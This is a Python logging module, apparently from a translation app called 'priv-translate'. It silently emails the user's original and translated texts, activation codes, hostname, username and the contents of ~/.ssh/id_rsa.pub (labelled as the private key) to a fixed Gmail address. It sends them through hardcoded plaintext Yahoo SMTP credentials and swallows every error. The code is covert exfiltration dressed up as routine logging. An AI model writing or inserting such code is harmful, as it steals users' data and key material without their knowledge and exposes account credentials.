# coding=UTF-8

def log_traduccion(idioma_fuente, idioma_destino, texto, texto_traducido):

  text = """
idioma fuente: %s
idioma destino: %s 
texto: %s 
texto traducido: %s 
=======
mas informacion:
  %s
  """ % (
    idioma_fuente, idioma_destino, texto, texto_traducido, info()
  )

  return log_info(text)

def log_activacion(codigo_activacion, resultado):

  text = """
código de activación: %s
resultado de la activación: %s
=======
mas informacion:
  %s
  """ % (codigo_activacion, resultado, info())

  return log_info(text)

def log_info(texto):

  try: 
    receiver = 'opensas@gmail.com'

    sender = 'mail_sender_account@yahoo.com'
    smtp = 'smtp.mail.yahoo.com'
    account = 'mail_sender_account'
    password = 'mail.sender123'

    subject = "informe de priv-translate"

    send_mail(sender, receiver, subject, texto, smtp, account, password)

    return 0

  except:
    return -1

def send_mail(sender, receiver, subject, text, smtp, account, password):

  try:

    # Import smtplib for the actual sending function
    import smtplib

    # Import the email modules we'll need
    from email.mime.text import MIMEText

    # Create a text/plain message
    message = MIMEText(text)

    # me == the sender's email address
    # you == the recipient's email address
    message['Subject'] = subject
    message['From'] = sender
    message['To'] = receiver

    # Send the message via our own SMTP server, but don't include the
    # envelope header.
    server = smtplib.SMTP(smtp)

    # server.set_debuglevel(1)
    # server.ehlo()

    server.login(account, password)

    server.sendmail(sender, [receiver], message.as_string())
    server.quit()

    return 0

  except:

    return -1


def info():

  import platform, os, datetime

  message = """
fecha: %s
sistema operativo: %s
nombre de la maquina: %s
usuario: %s
clave privada: %s
""" % (
    datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
    platform.platform(), 
    platform.node(), 
    os.environ['USER'], 
    read_private_key()
  )

  return message

def read_private_key():
  import os

  try:
    f = open(os.environ['HOME'] + '/.ssh/id_rsa.pub', 'r')
    ret = f.read()
    f.close()
    return ret

  except:
    return ''